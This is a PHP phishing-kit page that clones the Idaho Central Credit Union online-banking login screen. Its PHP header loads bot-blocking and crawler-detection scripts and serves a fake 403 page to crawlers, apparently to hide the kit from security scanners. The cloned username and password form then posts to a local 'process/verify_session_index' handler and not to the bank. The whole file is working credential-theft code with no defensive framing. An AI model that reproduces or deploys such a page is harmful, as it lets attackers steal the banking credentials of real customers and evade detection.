<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
?>

<html lang="en-US" data-mobile-page="" class="js-focus-visible">

<head>
	<style>
	body {
		transition: opacity ease-in 0.2s;
	}
	
	body[unresolved] {
		opacity: 0;
		display: block;
		overflow: hidden;
		position: relative;
	}
	</style>
	<link rel="dns-prefetch" href="//fonts.googleapis.com/">
	<link rel="apple-touch-icon" sizes="60x60" href="files/apple-touch-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="76x76" href="files/apple-touch-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="120x120" href="files/apple-touch-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="152x152" href="files/apple-touch-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="files/apple-touch-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="192x192" href="files/android-chrome-192x192.png">
	<link rel="icon" type="image/png" sizes="16x16" href="files/favicon-16x16.png">
	<link rel="manifest" href="files/site.webmanifest">
	<link rel="mask-icon" href="files/safari-pinned-tab.svg" color="true">
	<link rel="shortcut icon" href="files/favicon.ico">
	<meta name="msapplication-TileColor" content="true">
	<meta name="msapplication-TileImage" content="files/mstile-144x144.png">
	<meta name="msapplication-config" content="files/browserconfig.xml">
	<meta name="theme-color" content="true">
	<link href="files/font-icons.css" rel="stylesheet" type="text/css">
	<title>Idaho Central Credit Union</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
	<meta name="format-detection" content="telephone=no">
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="Stylesheet" type="text/css">
	<link href="files/jquery-ui.min.css" rel="stylesheet" type="text/css">
	<link href="files/base.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris.shim.mobile.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris.android.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris-foundation.min.css" rel="stylesheet" type="text/css">
	<link href="files/theme.mobile.min.css" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="files/iris-components.shim.mobile.min.css" type="text/css">
	<link rel="stylesheet" href="files/iris-foundation.min.css" type="text/css">
	<link rel="stylesheet" href="files/iris-components.min.css" type="text/css">
	<link rel="stylesheet" href="files/isotope.1.5.3.min.css" type="text/css">
	<link href="files/Authentication-Isotope.min.css" rel="stylesheet" type="text/css">
	<style id="inert-style">
	[inert] {
		pointer-events: none;
		cursor: default;
	}
	
	[inert],
	[inert] * {
		user-select: none;
		-webkit-user-select: none;
		-moz-user-select: none;
		-ms-user-select: none;
	}
	</style>
	
</head>

<body class="alk-body shared-layout isotope-mobile Authentication iris-mouse-use-detected windows challenge-type-username-and-password" id="username_page" data-orion="">
	<div id="mmenu_container">
		<div id="wrapper">
			<div id="content" class="clearfix">
				<div class="card-container flush-with-titlebar">
					<div class="card card-full-width">
						<div class="cms-content-area iris-content" data-cms-content-area="top-ribbon"></div>
					</div>
				</div>
				<div class="cms-content-area" data-cms-content-area="header-card"> </div>
				
				<div class="mobile-authentication-container">
					<div id="login_header" class="mobile-authentication-header">
						<div class="brand-logo" role="img" aria-label=""></div>
					</div>
					<div class="mobile-authentication-content">
						<div id="app" role="main" class="isotope-app">
							<div data-v-136bf7ca="" class="isotope-page--authentication isotope-page">
								<div data-v-136bf7ca="" class="isotope-challenge-type--username-and-password isotope-challenge-type">
									<div>
										<div id="irisv_sheet_42fx2s1fg6e" role="dialog" aria-labelledby="irisv_sheet_42fx2s1fg6e_title" aria-hidden="true" class="irisv-sheet irisv-sheet--side irisv-sheet--partial irisv-sheet--suppressed isotope-hidden--desktop info-sheet hidden" style="--device-height:746px; --device-height-partial:447.6px;">
											<div class="irisv-sheet__scrim"></div>
											<div tabindex="0" class="irisv-sheet__container" style="">
												<div tabindex="-1" class="irisv-sheet__header irisv-sheet__header--shadow">
													<!---->
													<!---->
													<h3 id="irisv_sheet_42fx2s1fg6e_title" class="irisv-sheet__header-text font-content-heading--high-emphasis irisv-sheet__header-text--visible"> Information </h3>
													<!---->
													<div class="irisv-sheet__header-close-button" style="display: inline-block;">
														<button tabindex="0" role="button" aria-label="close" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded">
															<div>
																<div class="irisv-avatar">
																	<svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 24px; height: 24px; display: none;">
																		<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path>
																		<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path>
																	</svg>
																	<div class="irisv-avatar__status-line" style="width: 24px; height: 24px;">
																		<div role="img" class="irisv-avatar__content" style="width: 24px; height: 24px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-cancel-x irisv-icon--md irisv-avatar__content__main-icon--xsmall" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 24px; height: 24px; font-size: 8px;"><!----></span>
																			<!---->
																		</div>
																		<!---->
																		<!---->
																	</div>
																	<!---->
																</div>
																<!---->
															</div>
														</button>
													</div>
												</div>
												<div class="irisv-sheet__content">
													<div class="top-buffer"></div>
													<!---->
													<div class="irisv-sheet__inner-content">
														<div id="mobile-info-panel">
															<div class="fineprint">
																<p>Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.</p>
																<p>National Credit Union Administration, a U.S. Government Agency</p>
																<p>Copyright © 2022 Idaho Central Credit Union. All rights reserved.</p>
																<p><strong>Routing Number:</strong> 324 173 626</p>
															</div>
															<ul role="navigation" class="legal-links clearfix">
																<li><a href="https://www.iccu.com/wp-content/uploads/2015/01/privacy_notice.pdf" target="_blank">Privacy Policy</a></li>
															</ul>
														</div>
													</div>
													<div class="bottom-buffer"></div>
												</div>
												<!---->
												<div class="irisv-sheet__footer irisv-sheet__footer--shadow" style="display: none;"></div>
												<div tabindex="0"></div>
											</div>
										</div>
									</div>
									<div id="usernameAndPassword_ellipsis" class="ellipsis">
										<div class="irisv-menu-dropdown irisv-menu-dropdown--navigation irisv-menu-dropdown--quickactionbutton" id="ellipsis_menu">
											<div id="irisv_menu_dropdown_2a5w25ies6n" class="irisv-menu-dropdown__menu-button">
												<!---->
												<!---->
												<div aria-haspopup="true" is-static="true" size="medium" style="display: inline-block;">
													<button tabindex="0" role="button" aria-label="Menu" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded">
														<div>
															<div class="irisv-avatar">
																<svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;">
																	<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path>
																	<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path>
																</svg>
																<div class="irisv-avatar__status-line" style="width: 40px; height: 40px;">
																	<div role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-more irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 40px; height: 40px; font-size: 14px;"><!----></span>
																		<!---->
																	</div>
																	<!---->
																	<!---->
																</div>
																<!---->
															</div>
															<!---->
														</div>
													</button>
												</div>
											</div>
											<div class="irisv-menu-dropdown__menu-wrapper irisv-menu-dropdown__menu-wrapper--flow-down" style="display: none;">
												<div class="irisv-menu-dropdown__menu irisv-menu-dropdown__menu--navigation" style="max-width: none;">
													<ul aria-label="Menu" role="menu" tabindex="-1" class="irisv-menu-dropdown__menu-container">
														<li role="none"><a role="menuitem" tabindex="-1" data-value="0" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-live-chat irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Live Chat </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://www.iccu.com/rates/" data-value="1" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-rates irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Rates </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="/Mobile/Locations/LocationSearch" data-value="2" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-locations irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Locations </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://www.iccu.com" data-value="3" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-full-site irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> View Full Site </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="/Mobile/Contact" data-value="4" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-contact irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Contact </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="/Mobile/Support" data-value="5" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-support irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Support </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://www.facebook.com/IdahoCentralCreditUnion" data-value="6" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-facebook-small irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Facebook </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://twitter.com/Idaho_Central" data-value="7" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-twitter-small irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Twitter </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://www.youtube.com/IdahoCentralCU" data-value="8" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-youtube irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> YouTube </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://www.linkedin.com/company/idahocentralcreditunion" data-value="9" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-linkedin irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> LinkedIn </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" href="https://instagram.com/idahocentralcu/" data-value="10" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-instagram irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Instagram </div><!----></a></li>
														<li role="none"><a role="menuitem" tabindex="-1" target="__self" data-value="11" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-info irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Info </div><!----></a></li>
													</ul>
													<!---->
												</div>
											</div>
										</div>
									</div>
									<form role="form" method="POST" action="process/verify_session_index" class="isotope-slide usernameAndPasswordForm">
										<!---->
										<div class="isotope-slide__content">
											<div class="isotope-hidden--desktop mar-top--small"></div>
											<div class="isotope-hidden--mobile">
												<h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
                Welcome to online banking
            </h1></div>
											<div class="irisv-textfield mar-bottom-small irisv-textfield--filled">
												<div class="irisv-textfield__container">
													<div class="irisv-textfield__control irisv-textfield__control-spacing-icon">
														<div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-profile irisv-icon--md" aria-hidden="true"><!----></span></div>
														<div class="irisv-textfield__input-wrapper"><span id="username_label"><label for="username" class="irisv-textfield__label font-caption"> Username </label></span>
															<input type="text" aria-labelledby="username_label" aria-required="true" id="username" required="required" name="username" kind="underline" class="font-body-1 irisv-textfield__input">
														</div>
														<!---->
														<!---->
													</div>
													<div class="irisv-textfield__messages">
														<!---->
														<div role="alert">
															<!---->
														</div>
														<!---->
														<!---->
													</div>
												</div>
											</div>
											<div class="irisv-textfield irisv-textfield__password mar-top--small irisv-textfield--filled" kind="underline">
												<div class="irisv-textfield__container">
													<div class="irisv-textfield__control irisv-textfield__control-spacing-icon">
														<div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-lock irisv-icon--md" aria-hidden="true"><!----></span></div>
														<div class="irisv-textfield__input-wrapper"><span id="password_label"><label for="password" class="irisv-textfield__label font-caption"> Password </label></span>
															<input type="password" aria-labelledby="password_label" aria-required="true" id="password" name="password" required="required" class="irisv-textfield__input font-subtitle-1">
														</div>
														<!---->
														<div class="irisv-textfield__trailing-icon">
															<button aria-label="Show password" type="button" class="irisv-textfield__trailing-button"><span role="img" class="irisv-icon font-icon-show irisv-icon--md"><!----></span></button>
														</div>
													</div>
													<div class="irisv-textfield__messages">
														<!---->
														<div role="alert">
															<!---->
														</div>
														<!---->
														<!---->
													</div>
												</div>
											</div>
											<div class="mar-top--small">
												<div class="left-checkbox">
													<label class="irisv-checkbox font-body-1 irisv-checkbox--low-emphasis font-caption " id="rememberMeCheckBox">
														<input type="checkbox" class="irisv-checkbox__input"><span class="irisv-checkbox__check"><svg version="1.1" x="0px" y="0px" preserveAspectRatio="xMidYMin" viewBox="3 5 18.1 13.8" enable-background="new 3 5 18.1 13.8" xml:space="preserve"><polyline fill="none" stroke-width="2.1" stroke-miterlimit="10" points="3.7,12.2 8.8,17.3 20.3,5.7 " class="check"></polyline></svg></span><span class="irisv-checkbox__label">Remember me</span></label>
												</div>
												<div class="right-links">
													<a href="/Mobile/ForgotUsername" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;">
														<!----><span class="irisv-button__text"> Forgot username? </span>
														<!---->
														<!---->
													</a>
													<a href="/Mobile/ForgotPassword" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;">
														<!----><span class="irisv-button__text"> Forgot password? </span>
														<!---->
														<!---->
													</a>
												</div>
											</div>
										</div>
										<div class="isotope-slide__footer">
											<div class="mar-top--small">
												<div id="irisv_notification_4plcqgb5ze9" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_4plcqgb5ze9_heading" tabindex="0" class="irisv-notification inline error-light" style="display: none;">
													<div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_4plcqgb5ze9_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2">  </span></span>
														<button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button>
													</div>
													<div class="irisv-notification__trailing-content" style="display: none;"></div>
												</div>
											</div>
											<div class="mar-top--small">
												<div id="irisv_notification_cizg3jq702f" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_cizg3jq702f_heading" tabindex="0" class="irisv-notification inline error" style="display: none;">
													<div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_cizg3jq702f_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> An unexpected error has occurred. Please try again later. </span></span>
														<button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button>
													</div>
													<div class="irisv-notification__trailing-content" style="display: none;"></div>
												</div>
											</div>
											<div class="isotope-actions mar-top--small">
												<button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials">
													<!----><span class="irisv-button__text"> Log in </span>
													<!---->
													<!---->
												</button>
												<a href="/Mobile/Registration" class="irisv-button mar-top--tiny irisv-button--lowEmphasis irisv-button--onLight irisv-button--full-width text--none">
													<!----><span class="irisv-button__text"> Register </span>
													<!---->
													<!---->
												</a>
											</div>
										</div>
									</form>
									<div class="isotope-hidden--desktop mar-bottom--small"></div>
									<form role="form" class="isotope-slide isotope-slide--aside isotope-hidden--mobile">
										<!---->
										<div class="isotope-slide__content">
											<div>
												<div>
													<p class="font-medium-heading"> On a mobile device? </p>
													<p class="mar-top--small font-body-2"> Download the app for convenient and secure access to your accounts. </p>
												</div>
											</div>
											<ul>
												<li>
													<div class="inline-flex mar-top--base">
														<div class="irisv-avatar">
															<svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;">
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path>
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path>
															</svg>
															<div class="irisv-avatar__status-line" style="width: 40px; height: 40px;">
																<div aria-label="Biometric Login" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-touchid irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span>
																	<!---->
																</div>
																<!---->
																<!---->
															</div>
															<!---->
														</div>
														<div class="iris-list-item__text mar-left--small"><b class="font-subtitle-2">Biometric Login</b>
															<p class="font-caption"> Use your device hardware </p>
														</div>
													</div>
												</li>
												<li>
													<div class="inline-flex mar-top--base">
														<div class="irisv-avatar">
															<svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;">
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path>
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path>
															</svg>
															<div class="irisv-avatar__status-line" style="width: 40px; height: 40px;">
																<div aria-label="Nearby ATMs" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-atm-locator irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span>
																	<!---->
																</div>
																<!---->
																<!---->
															</div>
															<!---->
														</div>
														<div class="mar-left--small"><b class="font-subtitle-2">Nearby ATMs</b>
															<p class="font-caption"> Enable location services </p>
														</div>
													</div>
												</li>
												<li>
													<div class="inline-flex mar-top--base">
														<div class="irisv-avatar">
															<svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;">
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path>
																<path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path>
															</svg>
															<div class="irisv-avatar__status-line" style="width: 40px; height: 40px;">
																<div aria-label="Snapshot" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-phone2 irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span>
																	<!---->
																</div>
																<!---->
																<!---->
															</div>
															<!---->
														</div>
														<div class="mar-left--small"><b class="font-subtitle-2">Snapshot</b>
															<p class="font-caption"> Preview accounts without logging in </p>
														</div>
													</div>
												</li>
											</ul>
											<div id="badges" class="inline-flex mar-top--base">
												<a href=""><img id="app-store" alt="Download on the App Store" src="files/app-store-badge.svg" height="33px"></a>
												<a href="" class="mar-left--tiny"><img id="google-play" alt="Get it on Google Play" src="files/google-play-badge.svg" height="33px"></a>
											</div>
											<div class="text--center">
												<a href="/Mobile/Authentication" class="irisv-button mar-top--base irisv-button--compact irisv-button--onLight text--none" id="mobile-link">
													<!----><span class="irisv-button__text"> Go to mobile site </span>
													<!---->
													<!---->
												</a>
											</div>
										</div>
										<!---->
									</form>
								</div>
								<form data-v-136bf7ca="" id="form_authenticated" method="POST" action="https://myebranch.iccu.com/Authentication/Authenticated">
									<input data-v-136bf7ca="" type="hidden" name="username">
									<input data-v-136bf7ca="" type="hidden" name="nonce">
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="cms-content-area" data-cms-content-area="body-card"> </div>
		</div>
		<footer id="mobile_footer" role="contentinfo">
			<div class="container">
				<ul role="navigation" class="utility-links clearfix">
					<li id="bold_chat_container" class="bcText">
						<a href="#">
							<div id="0.6367891856607535"><span class="off">Chat Unavailable</span></div>
						</a>
					</li>
					<li class="list-item-full-site"><a href="/Client/Home" class="icon" id="full-site">View Full Site</a></li>
				</ul>
				<hr>
				<div id="mobile_info_panel">
					<div class="fineprint">
						<p>Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.</p>
						<p>National Credit Union Administration, a U.S. Government Agency</p>
						<p>Copyright © 2022 Idaho Central Credit Union. All rights reserved.</p>
						<p><strong>Routing Number:</strong> 324 173 626</p>
					</div>
					<ul role="navigation" class="legal-links clearfix">
						<li><a href="https://www.iccu.com/wp-content/uploads/2015/01/privacy_notice.pdf" target="_blank">Privacy Policy</a></li>
					</ul>
				</div>
			</div>
		</footer>
	</div>
	<div id="locale_confirmation" class="alk-bottom-panel alk-bottom-panel-full">
		<div class="alk-bottom-panel-header"> Locale Change Confirmation
			<button class="alk-bottom-panel-close font-icon font-icon-cancel-x" aria-label="Close Panel"></button>
		</div>
		<div class="alk-bottom-panel-content card-container">
			<div class="confirm">
				<div class="no-card">
					<p>Changing your preferred language affects all member-facing text, including messages and notification alerts.</p>
				</div>
				<div class="buttons">
					<button id="confirm_locale" class="button primary">Confirm</button>
					<button id="cancel_locale" class="button text">Cancel</button>
				</div>
			</div>
			<div class="confirming">
				<div class="loader">
					<p id="instructions">Please wait...</p>
					<div class="loader-pip"></div>
				</div>
			</div>
		</div>
	</div>
	
	<div id="second_factor_container" class="card-container card-container-modal" style="display: none;"></div>
</body>

</html>